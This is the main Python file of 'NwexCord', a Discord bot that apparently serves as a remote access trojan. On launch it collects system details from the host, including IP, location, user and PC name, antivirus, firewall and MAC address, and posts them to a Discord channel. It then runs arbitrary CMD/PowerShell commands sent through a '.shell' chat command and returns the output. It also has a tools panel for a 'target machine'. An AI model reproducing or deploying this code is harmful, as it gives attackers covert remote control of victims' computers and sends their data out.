#!/usr/bin/env python3
"""
NwexCord - Discord Interactive Shell Bot
A tool for executing shell commands via Discord messages
"""

import discord
from discord.ext import commands
import sys
import asyncio
import time
from datetime import datetime

import config
from core.info import get_sys_info
from core.shell import ShellExecutor
from core.views import StartupView
from Tools.Tools.panel import embed_tools_panel, ToolsPanelView

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=config.PREFIX, intents=intents)

@bot.event
async def on_ready():
    client_id = bot.user.id
    invite_link = f"https://discord.com/api/oauth2/authorize?client_id={client_id}&permissions=8&scope=bot"
    
    print(f'--- NwexCord Active ---')
    print(f'Bot Username: {bot.user.name}')
    print(f'Bot ID: {bot.user.id}')
    print(f'Server Count: {len(bot.guilds)}')
    print(f'Invite Link: {invite_link}')
    print(f'----------------------')
    
    if len(bot.guilds) == 0:
        print("WARNING: The bot is currently not in any servers!")
        print("Please use the link above to invite the bot to your server.")
    
    # Set bot status (Activity)
    await bot.change_presence(activity=discord.Activity(
        type=discord.ActivityType.listening, 
        name=f"{config.PREFIX}shell"
    ))
    
    # Send "Active" message to the first available channel
    sent_message = False
    
    info = get_sys_info()
    
    # Truncate potentially long strings in info
    for key in info:
        if isinstance(info[key], str) and len(info[key]) > 200:
            info[key] = info[key][:197] + "..."


    left_col = (
        f"🌐 **IP** : {info.get('IP', 'Unknown')}\n"
        f"👤 **UserName** : {info['UserName']}\n"
        f"🖥️ **PCName** : {info['PCName']}\n"
        f"🪟 **OS** : {info['OS']}\n"
        f"📁 **Client** : {info['Client']}\n"
        f"⚙️ **Process** : {info['Process']}\n"
        f"📅 **DateTime** : {info['DateTime']}\n"
        f"🎇 **GPU** : {info['GPU']}\n"
        f"🧠 **CPU** : {info['CPU']}\n"
        f"🏷️ **Identifier** : {info['Identifier']}\n"
        f"📊 **Ram** : {info['Ram']}"
    )
    
    right_col = (
        f"📍 **Location** : {info.get('Location', 'Unknown')}\n"
        f"⏱️ **LastReboot** : {info['LastReboot']}\n"
        f"🛡️ **Antivirus** : {info['Antivirus']}\n"
        f"⚠️ **Firewall** : {info['Firewall']}\n"
        f"🌐 **MacAddress** : {info['MacAddress']}\n"
        f"🌍 **DefaultBrowser** : {info['DefaultBrowser']}\n"
        f"🗣️ **CurrentLang** : {info['CurrentLang']}\n"
        f"💻 **Platform** : {info['Platform']}\n"
        f"📋 **Ver** : {info['Ver']}\n"
        f"🔵 **.Net** : {info['.Net']}\n"
        f"🔋 **Battery** : {info['Battery']}"
    )
    
    embed = discord.Embed(
        title="[ Information ]", 
        color=discord.Color.dark_theme()
    )
    embed.add_field(name="\u200b", value=left_col, inline=True)
    embed.add_field(name="\u200b", value=right_col, inline=True)
    embed.set_footer(text=f"NwexCord • System Information • {datetime.now().strftime('Today at %#I:%M %p')}")
    
    msg_content = f"🚀 **NwexCord System Started!**\nUse `{config.PREFIX}shell <command>` to execute CMD/PowerShell commands on this machine."
    
    # Wait a bit for the connection to fully stabilize
    await asyncio.sleep(2)
    
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                try:
                    # Attempt a simple message first if needed, but here we'll just try to send the full embed
                    # with a retry logic for 503 / 502 errors.
                    max_retries = 3
                    for attempt in range(max_retries):
                        try:
                            await channel.send(content=msg_content, embed=embed, view=StartupView())
                            sent_message = True
                            break
                        except discord.HTTPException as e:
                            if e.status in [502, 503, 504] and attempt < max_retries - 1:
                                print(f"Temporary Discord error {e.status} in {channel.name}, retrying in 3s... (Attempt {attempt+1}/{max_retries})")
                                await asyncio.sleep(3)
                                continue
                            else:
                                raise e
                    if sent_message: break
                except Exception as e:
                    print(f"Error sending to {channel.name}: {e}")
                    continue
        if sent_message: break


@bot.command(name="shell")
async def shell_command(ctx, *, cmd: str):
    """Executes command via Discord: .shell dir"""
    
    # Send info message
    msg = await ctx.send(f"⚡ Executing: `{cmd}`...")
    
    # Execute command
    result = ShellExecutor.execute(cmd)
    
    # Prepare output
    output = ""
    if result["stdout"]:
        # Discord has a 2000 character limit, taking the last 1500 characters
        stdout_text = result["stdout"]
        if len(stdout_text) > 1500:
            stdout_text = "...(truncated)...\n" + stdout_text[-1500:]
        output += f"**Output:**\n```\n{stdout_text}\n```\n"
        
    if result["stderr"]:
        stderr_text = result["stderr"]
        if len(stderr_text) > 400:
            stderr_text = stderr_text[:400] + "\n...(truncated)..."
        output += f"**Errors:**\n```\n{stderr_text}\n```\n"
        
    if not output:
        output = "Command executed but produced no output."

    # Create embed
    color = discord.Color.green() if result["success"] else discord.Color.red()
    status = "✅ Success" if result["success"] else "❌ Error"
    
    embed = discord.Embed(
        title=f"{status}: {cmd[:50]}",
        description=output,
        color=color,
        timestamp=datetime.utcnow()
    )
    embed.set_footer(text=f"Return Code: {result['return_code']}")
    
    await msg.edit(content=None, embed=embed)

@bot.command(name="ping")
async def ping(ctx):
    await ctx.send(f"Pong! Latency: {round(bot.latency * 1000)}ms")

@bot.command(name="tools")
async def tools_command(ctx):
    """Opens the tools panel with interactive buttons."""
    tools_embed = discord.Embed(
        title="🧰 NwexCord Tools",
        description="Select a tool from the buttons below to execute it on the target machine.",
        color=discord.Color.blurple()
    )
    tools_embed.set_footer(text="NwexCord • Tools Panel")
    await ctx.send(embed=tools_embed, view=ToolsPanelView())

if __name__ == "__main__":
    if config.BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("ERROR: Please add your Discord Bot Token to config.py!")
        sys.exit(1)
        
    max_retries = 5
    for attempt in range(max_retries):
        try:
            bot.run(config.BOT_TOKEN.strip())
            break
        except Exception as e:
            error_msg = str(e)
            if ("503" in error_msg or "Service Unavailable" in error_msg or "overflow" in error_msg) and attempt < max_retries - 1:
                wait_time = 5 * (attempt + 1)
                print(f"Failed to start bot (503 Overflow): {error_msg}")
                print(f"Retrying in {wait_time} seconds... (Attempt {attempt + 1}/{max_retries})")
                time.sleep(wait_time)
            else:
                print(f"Failed to start bot: {e}")
                break
